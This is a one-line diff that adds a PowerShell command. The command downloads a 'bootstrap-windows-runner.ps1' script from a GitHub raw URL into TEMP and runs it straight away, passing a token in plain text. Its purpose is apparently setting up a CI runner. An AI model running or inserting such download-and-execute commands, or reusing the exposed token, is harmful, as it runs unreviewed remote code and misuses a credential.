@@ -1,0 +1,1 @@
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Bigfootage/hermes-desktop-client/main/.github/scripts/bootstrap-windows-runner.ps1 -OutFile $env:TEMP\bootstrap.ps1; & $env:TEMP\bootstrap.ps1 -Token BM5PAAX5FIOOUNT3VY5BUFLKTLPZ2"
